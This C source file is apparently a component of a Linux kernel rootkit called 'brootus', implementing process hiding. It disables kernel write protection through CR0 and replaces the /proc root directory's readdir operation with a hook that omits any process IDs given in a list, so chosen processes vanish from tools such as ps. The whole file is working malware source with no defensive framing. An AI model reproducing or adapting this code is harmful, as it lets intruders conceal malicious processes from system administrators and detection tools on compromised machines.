#include <linux/module.h> /* Needed by all modules */
#include <linux/kernel.h> /* Needed for KERN_INFO */
#include <linux/unistd.h> /* Needed for indexing the sys_call_table and other constants */
#include <linux/mm_types.h>
#include <linux/types.h>  /* Needed for linux typedefs, currently not directly in use */
#include <asm/uaccess.h>  /* Needed for copy_from_user */
#include <linux/dirent.h> /* Not needed right here, but we'll stick to that */
#include <linux/sched.h>  /* Needed for task_struct and list makros */
#include <linux/proc_fs.h>  /* Needed for proc operations */
#include <linux/namei.h>

#include "kernel_variables.h"
#include "process_hiding.h"

#define MAX_PIDS 1024
#define STATE_PROCESS_VISIBLE 0
#define STATE_PROCESS_HIDDEN 1

int process_hiding_state = STATE_PROCESS_VISIBLE;

int (*original_readdir) (struct file *, void *, filldir_t);

struct file_operations* proc_fops;
filldir_t original_filldir;

unsigned int pids[MAX_PIDS];
unsigned int pid_count = 0;

void set_pids(char* pids_str)
{
  char* c = pids_str;
  char* pos = strstr(c, ",");
  unsigned int pid;

  // Reset PIDs
  pid_count = 0;

  while (pos != NULL)
  {
    *pos = '\0';
    if (sscanf(c, "%ud", &pid) == 1) {
      pids[pid_count++] = pid;
    }

    c = pos + 1;
    pos = strstr(c, ",");
  }
  if (sscanf(c, "%ud", &pid) == 1) {
    pids[pid_count++] = pid;
  }
}

int in_array(int* arr, int val, int count) {
  int i;
  for (i=0; i<count; i++) {
    if( arr[i] == val ) {
      return 0;
    }
  }
  return 1;
}

int brootus_filldir(void *buf, const char *name, int namlen, loff_t offset, u64 ino, unsigned int d_type) {
  long name_as_int;

  strict_strtol(name, 10, &name_as_int);

  if (!in_array(pids, name_as_int, pid_count)) {
    return 0;
  } else {
    return original_filldir(buf, name, namlen, offset, ino, d_type);
  }
}

int brootus_readdir(struct file *fp, void *buf, filldir_t fdir) {
  original_filldir = fdir;
  return original_readdir(fp, buf, brootus_filldir);
}

void enable_process_hiding(void) {
  if (process_hiding_state == STATE_PROCESS_HIDDEN) {
    return;
  }
  //Approach: Hook file operations of the proc-fs in order to hide processes
  proc_fops = (struct file_operations*) proc_root->proc_fops;
  original_readdir = proc_fops->readdir;

  write_cr0(read_cr0() & (~0x10000));
  proc_fops->readdir = brootus_readdir;
  write_cr0(read_cr0() | 0x10000);

  process_hiding_state = STATE_PROCESS_HIDDEN;
}

void disable_process_hiding(void)
{
  if (process_hiding_state == STATE_PROCESS_VISIBLE) {
    return;
  }
  write_cr0(read_cr0() & (~0x10000));
  proc_fops->readdir = original_readdir;
  write_cr0(read_cr0() | 0x10000);

  process_hiding_state = STATE_PROCESS_VISIBLE;
}

void init_process_hiding(void)
{
  enable_process_hiding();
}

void finalize_process_hiding(void)
{
  disable_process_hiding();
}